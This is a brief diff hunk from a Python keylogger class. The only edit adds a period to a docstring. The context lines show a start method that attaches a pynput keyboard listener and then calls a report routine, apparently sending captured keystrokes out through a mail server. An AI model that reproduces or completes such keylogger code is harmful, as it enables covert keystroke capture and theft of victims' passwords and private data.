@@ -39,7 +39,7 @@ class Keylogger:
         server.quit()
 
     def start(self):
-        """Start listening to keystrokes on your keyboard"""
+        """Start listening to keystrokes on your keyboard."""
         keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
         with keyboard_listener:
             self.report()
